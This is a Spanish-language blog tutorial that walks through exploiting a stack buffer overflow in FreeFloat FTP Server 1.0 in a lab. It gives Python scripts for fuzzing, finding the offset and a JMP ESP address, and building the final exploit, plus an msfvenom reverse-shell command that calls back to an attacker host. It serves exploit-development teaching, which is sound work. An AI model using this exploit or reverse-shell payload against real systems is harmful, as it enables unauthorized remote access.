---
title: "Rompiendo la pila: guía práctica de Buffer Overflow"
date: 2026-05-11 8:00:00 -0400
categories: [Artículos, Buffer Overflow]
tags: [Buffer overflow, guías, articulo]
pin: true
image:
  path: /assets/img/BOF-guia-practica/banner.png
  alt: "Buffer Overflow Banner"
---

La vulnerabilidad **Buffer Overflow** no es nueva en la industria 
de la informática; tuvo sus primeras apariciones en los años 80 haciéndose presentes 
principalmente en lenguajes de programación como `C`, donde el programador tiene control 
total sobre la memoria pero también toda la responsabilidad de manejarla correctamente, 
algo que no siempre ocurría.

## ¿Qué es un Buffer Overflow?

Un buffer overflow (desbordamiento de búfer) ocurre cuando un programa escribe más datos 
en un bloque de memoria (búfer) de los que este puede contener. El exceso de datos 
sobrescribe zonas de memoria adyacentes, lo que puede corromper datos, provocar crashes 
o, en el peor de los casos, permitir la ejecución de código arbitrario.

Este tipo de vulnerabilidad no es nueva. Sus primeras apariciones documentadas datan de 
los años 80, y uno de los casos más sonados fue el gusano Morris en 1988, que aprovechó 
un BOF en el servicio `fingerd` de Unix para propagarse por internet. Desde entonces, 
el buffer overflow se convirtió en una de las vulnerabilidades más estudiadas y explotadas 
en la historia de la seguridad informática.

Aunque los sistemas modernos cuentan con mitigaciones como ASLR, DEP o Stack Canaries, 
el BOF sigue siendo relevante hoy en día, especialmente en software legacy, 
binarios de 32 bits sin protecciones, y entornos embebidos.

## ¿Qué veremos en este artículo?

A lo largo de este artículo exploraremos el proceso completo de explotación de un buffer 
overflow de tipo stack-based sobre el binario **FreeFloat FTP Server 1.0**, 
vulnerable en el comando `USER`. El recorrido incluirá:

- **Fuzzing** para identificar el punto de crash
- **Determinación del offset** para calcular la distancia exacta al EIP
- **Identificación de badchars** para generar un shellcode limpio
- **Búsqueda de un JMP ESP** para redirigir la ejecución
- **Generación del shellcode** y construcción del exploit final


## Entorno de trabajo

Para este ejercicio se utilizó el siguiente entorno:

| Componente | Detalle |
|---|---|
| Sistema objetivo | [Windows 7 Home Premium](https://windows-7-home-premium.uptodown.com/windows) (32 bits) |
| Binario vulnerable | [FreeFloat FTP Server 1.0](https://archive.org/details/tucows_367516_Freefloat_FTP_Server) |
| Debugger | [Immunity Debugger](https://github.com/kbandla/ImmunityDebugger/releases/tag/1.85) + plugin [Mona](https://raw.githubusercontent.com/corelan/mona/master/mona.py) |
| Sistema atacante | Linux |
| Herramientas | Python3, msfvenom, msf-pattern_create |

> ⚠️ Este artículo es con fines educativos. El binario utilizado es 
> intencionalmente vulnerable y el laboratorio está en un entorno controlado.

## Proceso de explotación

### Fuzzing

La primera etapa en la explotación de un buffer overflow es identificar, mediante fuzzing, 
el tamaño de entrada necesario para provocar un crash y aproximar el punto en el que 
se comienza a sobrescribir el registro EIP.

Cabe mencionar que cada caso es distinto, por lo que a lo largo del artículo 
utilizaremos **Python 3** para construir los scripts necesarios de forma personalizada 
según el comportamiento del binario.

El código que estaremos usando para la fase de fuzzing será el siguiente:

```python
#!/usr/bin/python3
import socket
import time


# Variables globales
ip = "10.232.47.239"
port = 21

def exploit():
    size = 100 # Tamaño del payload

    while True:
        try:
            # Crear un socket TCP
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)  # Establecer un tiempo de espera para la conexión

            s.connect((ip, port))
            print(f"Conectado a {ip}:{port}")
            s.recv(1024)  # Recibir el banner del servidor (opcional)


            # Construir el payload
            payload = b"A" * size  # Rellenar con 'A's

            # Enviar el payload al servidor
            s.sendall(b"USER " + payload + b"\r\n")  # Enviar el comando USER con el payload
            print(f"Enviado payload de tamaño {size} bytes")

            # Cerrar la conexión
            s.close()

        except socket.error as e:
            print(f"[!] Socket error: {e}")
            print(f"[!] Posible crash en tamaño: {size}")
            break

        size += 100  # Incrementar el tamaño del payload para la siguiente iteración
        time.sleep(5) # Esperar un poco antes de la siguiente prueba
if __name__  == "__main__":
    exploit()
```

El script funciona de forma incremental: comienza enviando 100 bytes de `A`s al comando 
`USER` del servidor FTP, y en cada iteración aumenta el tamaño en 100 bytes más, 
esperando 5 segundos entre cada envío. Cuando el servidor deja de responder y se produce 
un timeout, el script lo interpreta como un crash e imprime el tamaño aproximado del 
payload que lo provocó.

Determinar el tamaño del búfer es importante porque nos da el rango en el que debemos trabajar. 
Si el crash ocurre con 400 bytes, sabemos que el búfer tiene menos de 400 bytes de 
capacidad, y que en algún punto entre 300 y 400 bytes comenzamos a escribir en zonas 
de memoria que no nos pertenecen. Este valor no es el offset exacto, sino una 
aproximación que usaremos como punto de partida en la siguiente etapa.

Al ejecutar el script y esperar a que finalice podemos ver la siguiente salida:

```bash
[!] Socket error: timed out
[!] Posible crash en tamaño: 400
```

Al revisar **Immunity Debugger** para ver el reporte del crash podemos ver lo siguiente:

![Reporte del crash en Inmunity Debugger](/assets/img/BOF-guia-practica/1.png)

Lo que ocurre en este momento es que no solo se produce el crash, sino que también se llega a sobrescribir el registro **EIP** (*Extended Instruction 
Pointer*), que es el registro encargado de indicarle al procesador cuál es la siguiente 
instrucción a ejecutar. Controlar el EIP significa controlar el flujo de ejecución del 
programa, y eso es precisamente lo que convierte un simple crash en una vulnerabilidad 
explotable. Profundizaremos en esto más adelante.

### Determinar el offset

Ahora que sabemos cuál es el tamaño de entrada necesario para provocar un crash, hay que determinar el `offset`.
El **offset** (desplazamiento) en un _buffer overflow_ es la cantidad exacta de bytes necesarios para llenar el búfer y alcanzar un punto crítico en la memoria, lo que permite controlar el valor del `EIP` con precisión.

Para determinar el offset en este caso, lo que haremos será generar una cadena en la que cada secuencia de 4 bytes es única; gracias a esto podemos, a través del valor que arroje el `EIP`, determinar el offset exacto.
Para eso usaremos el siguiente comando para crear un ciclo de 400 bytes:

```bash
❯ msf-pattern_create -l 400  
```

El script que estaremos usando será este:

```python
#!/usr/bin/python3
import socket
import sys
from struct import pack

# Variables globales
ip = "10.232.47.239"
port = 21
payload =b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8..." # los otros 400 bytes

def exploit():
    # Crear un socket TCP
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)  # Establecer un tiempo de espera para la conexión

    s.connect((ip, port))
    print(f"Conectado a {ip}:{port}")
    s.recv(1024)  # Recibir el banner del servidor

    # Enviar el payload al servidor
    s.sendall(b"USER " + payload + b"\r\n")  # Enviar el comando USER con el payload

    # Cerrar la conexión
    s.close()
 
if __name__  == "__main__":
    exploit()
```

Al ejecutar el código y efectuarse el crash del aplicativo podemos ver lo siguiente en el reporte del Immunity Debugger:

<img src="/assets/img/BOF-guia-practica/2.png" alt="offset stack" width="600"/>

Si esta cadena de bytes se la pasamos a `msf-pattern_offset` usando la **flag** `-q` con el siguiente formato `0x37684136`, tendremos el offset:

```bash
❯ msf-pattern_offset -q 0x37684136                                                                        
[*] Exact match at offset 230
```

En este caso el offset es 230; para comprobarlo solo hay que modificar las `Variables globales` de la siguiente forma:

```python
# Variables globales
ip = "10.232.47.239"
port = 21

before_eip = b"A" * 230 # Tamaño del offset
eip = b"B" * 4 # b en hexadecimal(42) * 4 

payload = before_eip + eip
```

Ya con esto podemos lanzar el script y ver que el `EIP` contiene las 4 B representadas en hexadecimal (42)

<img src="/assets/img/BOF-guia-practica/3.png" alt="offset stack" width="600"/>

## Asignación de espacio para el shellcode

Una vez encontrado el offset y sobrescrito el `EIP`, el siguiente paso es identificar **en qué parte de la memoria se están almacenando los caracteres adicionales luego del EIP**
Para esto cargaremos junto al payload una serie de `C` representadas en bytes una cantidad de 500 veces, para, al momento de ver la respuesta en el Immunity Debugger, buscar dónde se almacenan esas `C (43)`.
Para eso agregaremos lo siguiente a las variables globales:

```python
after_eip = b"C" * 500
payload = before_eip + eip + after_eip
```

Al momento de lanzar el script y ver la respuesta del Immunity Debugger se ve que 
el registro `ESP` apunta justo al inicio de nuestro `after_eip`. Esto tiene sentido ya 
que el `ESP` (*Extended Stack Pointer*) es el puntero de pila, es decir, un registro que 
siempre apunta a la cima actual del stack. Cuando el `EIP` es sobrescrito y la función 
intenta retornar, el `ESP` queda apuntando a los datos que siguen después del `EIP` en 
la pila, que en este caso son nuestras `C`s. Esto es importante porque más adelante 
usaremos esa posición para redirigir la ejecución hacia nuestro shellcode mediante un 
`JMP ESP` que indicaremos en el `EIP`.

Para poder ejemplificar esto de una forma más visual y amigable, se generó el siguiente gráfico:

<img src="/assets/img/BOF-guia-practica/offset_buffer_overflow_stack.svg" alt="offset stack" width="800"/>

En este gráfico se muestra cómo se distribuye el stack durante el proceso:

- El **azul** representa el búfer, donde se almacenan las 230 A's hasta llenarlo por completo
- El **ámbar** es el registro EIP, que pasa de `0x41414141` (A's en hex) a `0x42424242` 
  (B's) cuando el offset es correcto
- El **turquesa** es el espacio posterior al EIP, donde por ahora se almacenan las C's 
  y que más adelante contendrá el shellcode
- La fórmula al pie muestra cómo se construye el payload para verificar el offset

### Determinando los badchars

Determinar los badchars es crucial ya que permite generar un shellcode válido que no sea 
alterado durante su almacenamiento en memoria. Un badchar es cualquier byte que el programa 
interpreta de forma especial y que puede truncar o corromper el payload, como `\x00` (null 
byte) que indica fin de cadena en C.

Para identificarlos, primero generamos una lista de referencia con `!mona` que contiene 
todos los bytes posibles del `\x01` al `\xff`, excluyendo desde el inicio el null byte 
que sabemos que siempre es un badchar con el siguiente comando:

```bash
!mona bytearray -cpb "\x00"
```

Esto genera dos archivos en el directorio de trabajo de Immunity: `bytearray.txt` con los 
bytes en formato Python listos para copiar al script, y `bytearray.bin` que es la versión 
binaria que `!mona` usará como referencia para comparar contra lo que realmente llegó a 
memoria.

Enviamos esa lista como `after_eip` en el script y luego comparamos lo que se almacenó 
en memoria contra el archivo de referencia con:

```bash
!mona compare -a 0x<Dirección ESP> -f C:\ruta\bytearray.bin
```

`!mona` marcará como badchar cualquier byte que no coincida. Hay que excluirlo tanto del 
script como al regenerar el bytearray con `-cpb`, y repetir el proceso hasta que la 
comparación no arroje ningún badchar.

#### Problema encontrado durante el proceso

Durante el análisis se observó que el registro `ESP` no apuntaba exactamente al inicio 
del bytearray enviado, sino unos bytes después. Esto provocaba que `!mona compare` 
arrojara falsos badchars al comparar desde una dirección incorrecta.

Para resolverlo se verificó manualmente el dump de memoria, confirmando que los bytes 
llegaban correctamente. Luego se añadieron bytes de relleno (`bytes_extra`) antes del 
bytearray para alinear su inicio con la dirección exacta apuntada por `ESP`, eliminando 
los falsos positivos.

### Generando el shellcode

Con los badchars identificados, el siguiente paso es generar el shellcode. En este caso 
usaremos `msfvenom` para crear un payload de tipo **reverse shell**, es decir, un shellcode 
que al ejecutarse en la máquina víctima inicia una conexión de vuelta hacia nuestra máquina 
atacante, dándonos acceso a una shell.

```bash
msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 \
LHOST=10.232.47.238 LPORT=4444 -f c -e x86/shikata_ga_nai \
-b '\x00\x09\x0a\x0d' EXITFUNC=thread
```

Cada parámetro cumple una función específica:

| Parámetro | Descripción |
|---|---|
| `-p windows/shell_reverse_tcp` | Tipo de payload: reverse shell para Windows |
| `--platform windows` | Plataforma objetivo |
| `-a x86` | Arquitectura de 32 bits, acorde al binario vulnerable |
| `LHOST` | IP de la máquina atacante que recibirá la conexión |
| `LPORT` | Puerto en el que estaremos escuchando |
| `-f c` | Formato de salida en C (bytes en formato `\xNN`) |
| `-e x86/shikata_ga_nai` | Encoder para ofuscar el shellcode y evitar badchars |
| `-b '\x00\x09\x0a\x0d'` | Badchars encontrados en el paso anterior |
| `EXITFUNC=thread` | Al terminar el shellcode, cierra solo el hilo en lugar del proceso completo, manteniendo el servidor FTP en pie |

El encoder `shikata_ga_nai` es especialmente útil aquí porque además de evitar los 
badchars, ofusca el shellcode mediante un esquema de cifrado polimórfico XOR, lo que 
significa que el payload se auto-descifra en memoria en tiempo de ejecución.

La salida del comando es un arreglo de bytes en formato C que se copia directamente 
al script como la variable `shellcode`:

```python
shellcode = (
    b"\xdb\xcc\xd9\x74\x24\xf4\x5f..."
    b"..."
)
```

### Buscando el opcode JMP ESP

Con el shellcode listo, necesitamos hacer que el `EIP` apunte a una dirección de memoria 
que contenga la instrucción `JMP ESP`. Cuando el programa intente retornar usando el `EIP` 
sobrescrito, saltará a esa instrucción, que a su vez redirigirá la ejecución hacia el `ESP`, 
donde vive nuestro shellcode.

Para encontrar esta dirección hay dos enfoques con `!mona`:

**Opción 1 — Búsqueda en un módulo específico**

Primero se identifican los módulos cargados por el proceso y sus protecciones con:

```bash
!mona modules
```

Luego se busca la secuencia de bytes `\xFF\xE4` (el opcode de `JMP ESP`) dentro del 
módulo elegido:

```bash
!mona find -s "\xFF\xE4" -m <modulo>
```

Este método es más preciso ya que permite apuntar a módulos sin protecciones como ASLR 
o SafeSEH, lo que garantiza que la dirección sea estable entre ejecuciones.

**Opción 2 — Búsqueda global con wildcards**

Si la búsqueda por módulo no arroja resultados, se puede buscar en toda la memoria del 
proceso usando:

```bash
!mona findwild -s "jmp esp"
```

Esta búsqueda es más amplia y encuentra cualquier instrucción equivalente a `JMP ESP` 
independientemente del módulo donde se encuentre. En este caso arrojó 27 direcciones 
válidas; para este caso se estará usando la dirección `0x759f3cda`.

> Al elegir una dirección hay que verificar que no contenga ningún badchar, ya que esa 
> dirección será escrita directamente en el `EIP` y cualquier byte problemático podría 
> corromperla.

### Script final

Con toda la información recopilada, el script final queda construido de la siguiente forma:

```python
from struct import pack # Añadirlo junto a los demás paquetes

# Variables globales
ip = "10.232.47.239"
port = 21
before_eip = b"A" * 230                  # relleno hasta el EIP (offset)
jmp_esp = pack("<L", 0x759f3cda)        # dirección del JMP ESP en little-endian
bytes_extra = b"A" * 8                    # alineación del ESP al shellcode
nops = b"\x90" * 16                  # NOP sled
shellcode = (
    b"\xdb\xcc\xd9\x74\x24\xf4\x5f..."
    b"..."
)

payload = before_eip + jmp_esp + bytes_extra + nops + shellcode
```

#### Por qué `pack("<L", 0x759f3cda)`

Los procesadores x86 almacenan los valores en memoria en formato **little-endian**, es 
decir, el byte menos significativo se escribe primero. Esto significa que la dirección 
`0x759f3cda` no se envía tal cual, sino invertida byte a byte:

```
Original:    75 9f 3c da
Little-endian: da 3c 9f 75
```

`pack("<L", ...)` de la librería `struct` hace esa conversión automáticamente. El `<` 
indica little-endian y la `L` que es un valor de 4 bytes sin signo (unsigned long), 
que es exactamente el tamaño del `EIP`.

#### Qué hace cada parte del payload

| Variable | Contenido | Propósito |
|---|---|---|
| `before_eip` | `b"A" × 230` | Rellena el búfer hasta alcanzar el EIP |
| `jmp_esp` | Dirección `0x759f3cda` | Sobrescribe el EIP con la instrucción JMP ESP |
| `bytes_extra` | `b"A" × 8` | Corrige el desplazamiento del ESP para que apunte al inicio del shellcode |
| `nops` | `b"\x90" × 16` | NOP sled: instrucciones vacías que le dan margen al shellcode para descifrarse antes de ejecutarse |
| `shellcode` | Payload generado con msfvenom | La reverse shell que se ejecuta en la máquina víctima |

#### El NOP sled

`\x90` es el opcode de la instrucción `NOP` (*No Operation*), que simplemente le dice 
al procesador que no haga nada y avance al siguiente byte. El bloque de 16 NOPs antes 
del shellcode actúa como un colchón de aterrizaje: como el encoder `shikata_ga_nai` 
necesita algunos ciclos para descifrar el shellcode en memoria antes de ejecutarlo, los 
NOPs le dan ese espacio sin que el flujo de ejecución tropiece con bytes que aún no están 
listos.

### Ejecución exitosa del shellcode

Ya con todo lo anterior configurado, solo queda ponernos en modo escucha por el puerto definido al generar el shellcode, y ejecutar el exploit para comprobar si somos capaces de explotar este Buffer Overflow.

Al momento de ejecutarlo vemos que recibimos la consola CMD de Windows.

![](/assets/img/BOF-guia-practica/4.png)

Si comprobamos la IP podemos ver que en efecto estamos dentro de la máquina.

![](/assets/img/BOF-guia-practica/5.png)

## Conclusión

Este ejercicio cubre el flujo completo de explotación de un buffer overflow clásico en 
un entorno sin protecciones modernas. Si bien binarios como FreeFloat FTP Server 1.0 
son intencionalmente vulnerables y los sistemas actuales cuentan con mitigaciones como 
ASLR, DEP o Stack Canaries, entender este proceso base es fundamental para comprender 
técnicas más avanzadas de explotación.

Para más contenido como este, incluyendo writeups y otros artículos técnicos, puedes 
visitar mi [GitHub](https://github.com/klinavi).
